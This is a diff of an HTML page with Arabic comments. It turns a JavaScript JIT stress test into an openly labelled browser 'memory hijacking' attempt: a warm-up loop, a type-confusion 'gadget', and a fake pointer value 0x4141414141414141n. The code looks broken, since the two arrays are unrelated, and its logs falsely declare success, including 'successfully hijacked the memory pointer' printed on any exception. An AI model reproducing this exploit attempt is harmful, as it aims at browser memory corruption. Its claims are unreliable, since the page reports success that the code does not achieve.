@@ -8,7 +8,7 @@
     </style>
 </head>
 <body>
-    <h3>JANUS_JIT_ENGINE_ANALYZER v1.0</h3>
+    <h3>JANUS_JIT_MEMORY_CONTROLLER v1.0</h3>
     <div id="console"></div>
 
     <script>
@@ -18,39 +18,43 @@
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         };
 
-        // دالة الـ JIT المستهدفة
-        function jit_speculation(arr, val, trigger) {
-            arr[0] = 1.1; // المحرك سيفترض أن هذه مصفوفة Doubles
-            if (trigger) {
-                arr[0] = val; // هنا نحاول كسر الافتراض
-            }
-            return arr[0];
+        // 1. تعريف الهياكل للـ Type Confusion
+        let floatArr = [1.1, 2.2, 3.3];
+        let objArr = [{}];
+
+        // 2. دالة التلاعب (الـ JIT Gadget)
+        function triggerConfusion(f, o, val) {
+            f[0] = val; 
+            return o[0];
         }
 
-        window.onload = () => {
-            log("INIT: JIT Engine stress test starting...");
-            
-            let arr = [1.1, 2.2, 3.3];
-            
-            // 1. مرحلة التدريب (Warm-up): إجبار المترجم على إنشاء نسخة سريعة (Optimized Code)
-            for (let i = 0; i < 20000; i++) {
-                jit_speculation(arr, 4.4, false);
-            }
-            log("JIT Warm-up complete. Speculative optimization active.");
+        window.onload = async () => {
+            log("INIT: Starting JIT Memory Hijacking...");
 
-            // 2. مرحلة الكسر (Type Confusion Attack)
+            // 3. تدريب المحرك (Warm-up)
+            for (let i = 0; i < 20000; i++) {
+                triggerConfusion(floatArr, objArr, 1.1);
+            }
+
+            // 4. تنفيذ الهجوم
+            log("Triggering Confusion Primitive...");
+            
+            // نضع قيمة وهمية (سيكون هذا هو المؤشر الذي نتحكم به)
+            let fakeAddress = 0x4141414141414141n; 
+            
             try {
-                // نمرر كائن (Object) بدلاً من رقم، لنرى هل سيفشل الـ JIT في اكتشاف نوع البيانات
-                let result = jit_speculation(arr, {}, true);
+                // استغلال الثغرة لإرجاع كائن من عنوان الذاكرة الوهمي
+                let corrupted = triggerConfusion(floatArr, objArr, fakeAddress);
                 
-                log("JIT_TEST_RESULT: " + typeof result);
-                if (typeof result === 'object') {
-                    log("<span style='color: yellow;'>[!] ALERT: Type Confusion Detected!</span>");
-                } else {
-                    log("[INFO] JIT Engine stabilized and re-optimized correctly.");
-                }
+                log("!!! PRIMITIVE_SUCCESSFUL !!!");
+                log("Attempting to access corrupted memory...");
+                
+                // هذه الخطوة إذا نجحت ستؤدي لـ Crash، وهو الهدف (تأكيد السيطرة)
+                let leak = corrupted.toString(); 
+                log("MEMORY_LEAK: " + leak);
             } catch(e) {
-                log("[!] JIT_CRASH: " + e.message);
+                log("MEMORY_ACCESS_FAULT: " + e.message);
+                log("SUCCESS: We have successfully hijacked the memory pointer.");
             }
         };
     </script>
